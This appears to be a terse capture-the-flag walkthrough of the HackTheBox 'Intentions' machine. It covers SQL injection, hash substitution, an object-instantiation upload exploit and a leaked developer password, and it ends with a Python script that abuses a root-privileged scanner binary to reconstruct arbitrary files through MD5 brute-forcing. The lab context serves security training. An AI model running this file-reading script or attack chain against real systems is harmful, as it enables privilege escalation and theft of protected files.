![image](https://github.com/user-attachments/assets/b0b1dac3-723f-4099-b20d-0f665a806a18)

HackTheBox - Intentions


https://0xdf.gitlab.io/2023/10/14/htb-intentions.html


Register account

Login account



















Database name is intentions.



Now we got columns, a list of table structure.





Now we got users data.



Rearrange all text.











Redirecting to home page because it requires authentication to view ths page. Without authentication, it will get redirected to home page.


Read this message. They are using v2 production.





Don't forget to replace the hash.

Now you are steve.

Now we can go to /admin.

View users list.

We can edit photos.

Intercept request




If we change the filename or extension or magic byte it won't work, it won't take it as input.

Read this 
https://swarm.ptsecurity.com/exploiting-arbitrary-object-instantiations/








Hit Ctrl+U to URL encode and send.






Zip .git


Move to public folder


Download that file


Unzip





This looks interesting. Check what changes difference has been made






'email' => 'greg@intentions.htb', 'password' => 'Gr3g1sTh3B3stDev3l0per!1998!'])





/opt/scanner/scanner has ability to read the files as root.











https://0xdf.gitlab.io/2023/10/14/htb-intentions.html
#!/usr/bin/env python3

import hashlib
import subprocess
import sys


def get_hash(fn, n):
    """Get the target hash for n length characters of 
    filename fn"""
    proc = subprocess.run(f"/opt/scanner/scanner -c {fn} -s whatever -p -l {n}".split(),
                stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    try:
        return proc.stdout.decode().strip().split()[-1]
    except IndexError:
        return None


def get_next_char(output, target):
    """Take the current output and figure out what the
    next character will be given the target hash"""
    for i in range(256):
        if target == hashlib.md5(output + chr(i).encode()).hexdigest():
            return chr(i).encode()


output = b""
fn = sys.argv[1]

while True:
    target = get_hash(fn, len(output) + 1)
    next_char = get_next_char(output, target)
    if next_char is None:
        break
    output += next_char
    print(next_char.decode(), end="")











